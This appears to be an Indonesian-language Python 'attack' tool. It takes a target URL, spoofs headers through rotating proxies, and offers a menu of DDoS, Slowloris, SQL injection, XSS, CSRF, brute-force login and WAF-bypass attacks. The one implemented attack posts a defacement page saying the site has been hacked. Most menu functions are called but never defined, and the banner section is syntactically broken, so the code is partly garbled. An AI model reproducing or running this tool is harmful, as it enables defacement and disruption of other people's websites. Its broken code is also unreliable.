import requests
import random
import string
import logging
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import base64
import os
import itertools

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
M = '\033[95m'
C = '\033[96m'
N = '\033[0m'

-------------------------{R}######{G}-------------------------
---------------------{R}######{G}--{R}######{G}---------------------
------------------{R}###{G}--------------{R}###{G}------------------
---------------{R}####{G}------------------{R}####{G}---------------
--------------{R}#{G}-{R}#{G}--------------------{R}#{G}-{R}#{G}-{R}#{G}--------------
--------------{R}##{G}------------------------{R}##{G}--------------
-------------{R}#{G}----------------------------{R}#{G}-------------
------------{R}#{G}-------------{R}####{G}-------------{R}#{G}------------
-------------------------{R}######{G}-------------------------
-----------{R}#{G}--------{R}##{G}----{R}####{G}----{R}##{G}--------{R}#{G}-----------
----------{R}#{G}-------{R}######{G}---{R}##{G}---{R}######{G}-------{R}#{G}----------
---------{R}#{G}-----------------{R}##{G}----------------{R}##{G}---------
--------{R}#{G}--------{R}######################{G}-------{R}##{G}--------
-----------------{R}######################{G}-----------------
-------{R}#{G}--------------{R}##{G}---{R}##{G}---{R}##{G}--------------{R}#{G}-------
------------------{R}#{G}---{R}###{G}------{R}###{G}---{R}#{G}------------------
--------{R}#{G}----------{R}#{G}-------{R}##{G}-------{R}#{G}----------{R}#{G}--------
---------{R}#{G}----------{R}##{G}-{R}####{G}--{R}#######{G}----------{R}#{G}---------
------------{R}#{G}---------{R}#####{G}--{R}#####{G}---------{R}#{G}------------
----------{R}#{G}-------------{R}###{G}--{R}###{G}-------------{R}#{G}----------
-----------{R}##{G}------------------------------{R}##{G}-----------
-------{R}#####{G}--------------------------------{R}#####{G}-------
----{R}###{G}-{R}#{G}--------------------------------------{R}#{G}-{R}###{G}----
--------------------------------------------------------
--------------------------------------------------------
----------------------{R}#{G}----------{R}#{G}----------------------
----------------------{R}#{G}----------{R}#{G}----------------------
---------------------------------{R}#{G}----------------------""")
print("Printing banner...")
print(f"{R}                                                                                   {N}")
print(f"{R} ,-----.         ,--.                 ,--.                                         {N}")
print(f"{Y}'  .--./,--. ,--.|  |-.  ,---. ,--.--.|  ,---.  ,---. ,--.--. ,---.  ,---.  ,---.  {N}")
print(f"{G}|  |     \\  '  /| .-. '| .-. :|  .--'|  .-.  || .-. :|  .--' | .-. || .-. (  .-'  {N}")
print(f"{C}'  '--'\\  \\   '| `-'  \\  --.|  |   |  | |  |\\  --.|  |    ' '-' \\ `---..-'  `) {N}")
print(f"{M} `-----'.-'  /    `---'  `----'`--'   `--' `--' `----'`--'    `---'  `----'`----'  {N}")
print(f"{Y}        `---'                                                                       {N}")
print("Banner printed.")  
logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

def load_file(file_name):
    try:
        with open(file_name, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        logging.error(f"File {file_name} tidak ditemukan!")
        return []

USER_AGENTS = load_file('user_agents.txt')
PROXIES = load_file('proxies.txt')

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def random_delay(min_delay=1, max_delay=3):
    time.sleep(random.randint(min_delay, max_delay))

def create_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': get_random_user_agent(),
        'Referer': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
    })
    return session

def send_request(url, session, proxy=None):
    try:
        response = session.get(url, proxies=proxy, timeout=5)
        logging.info(f"Request berhasil dikirim ke {url} | Status: {response.status_code}")
        return response
    except requests.exceptions.RequestException as e:
        logging.error(f"Request gagal: {e}")
        return None

def deface_payload(url, session):
    payload = """
    <html>
        <head>
            <title>Website Anda Telah Diuji Keamanan</title>
            <style>
                body {
                    background: linear-gradient(45deg, #1E90FF, #00BFFF, #87CEFA);
                    font-family: Arial, sans-serif;
                    color: white;
                    text-align: center;
                    margin: 0;
                    padding: 0;
                }
                h1 {
                    font-size: 60px;
                    text-shadow: 2px 2px 5px #00008B;
                    margin-top: 20%;
                }
                p {
                    font-size: 20px;
                    margin: 20px auto;
                    width: 70%;
                    text-shadow: 1px 1px 3px #4682B4;
                }
                .button {
                    display: inline-block;
                    margin-top: 30px;
                    padding: 15px 30px;
                    font-size: 18px;
                    color: #1E90FF;
                    background-color: white;
                    border: none;
                    border-radius: 50px;
                    cursor: pointer;
                    text-decoration: none;
                    font-weight: bold;
                    transition: 0.3s ease;
                }
                .button:hover {
                    background-color: #4682B4;
                    color: white;
                    transform: scale(1.1);
                }
            </style>
        </head>
        <body>
            <h1>Website Anda Telah di hack!</h1>
            <h1>canda hack<h1>
            <p>
                alasan utama kenapa web anda di hack.ada beberapa kemungkinan 
                1) melanggar hukum agama
                2) melanggar hukum ( judi dan peniuan )
                3) karena hacker nya gabut wkwkwkwkwkwk
            </p>
        </body>
    </html>
    """
    data = {"content": payload}
    try:
        response = session.post(url, data=data)
        if response.status_code == 200:
            logging.info(f"Deface berhasil dikirim ke {url}")
            print(f"{G}Deface berhasil! Periksa URL target untuk tampilan baru.{N}")
        else:
            logging.info(f"Deface gagal dikirim ke {url} | Status: {response.status_code}")
            print(f"{R}Deface gagal! Status code: {response.status_code}{N}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Deface gagal: {e}")
        print(f"{R}Deface gagal: {e}{N}")

def main():
    url = input("Masukkan URL target: ")
    session = create_session()
    logging.info(f"Mulai melakukan serangan pada {url}")

    while True:
        print(f"{Y}Pilih jenis serangan:{N}")
        print(f"{R}1{G}. Flooding (DDoS)")
        print(f"{R}2{G}. Slowloris")
        print(f"{R}3{G}. SQL Injection")
        print(f"{R}4{G}. XSS")
        print(f"{R}5{G}. CSRF")
        print(f"{R}6{G}. CAPTCHA Bypass")
        print(f"{R}7{G}. Brute Force Login")
        print(f"{R}8{G}. Bypass WAF")
        print(f"{R}9{G}. Deface Payload")
        print(f"{R}0{G}. Keluar")

        choice = input("Pilih opsi: ")

        if choice == "1":
            flood_target(url, session, 100)
        elif choice == "2":
            slowloris_attack(url, session)
        elif choice == "3":
            sql_injection(url, session)
        elif choice == "4":
            xss_attack(url, session)
        elif choice == "5":
            csrf_attack(url, session)
        elif choice == "6":
            captcha_bypass(url, session)
        elif choice == "7":
            users = ["admin", "user", "guest"]
            passwords = ["password123", "12345", "admin123"]
            brute_force_login(url, session, users, passwords)
        elif choice == "8":
            bypass_waf(url, session)
        elif choice == "9":
            deface_payload(url, session)
        elif choice == "0":
            break

if __name__ == "__main__":
    main()
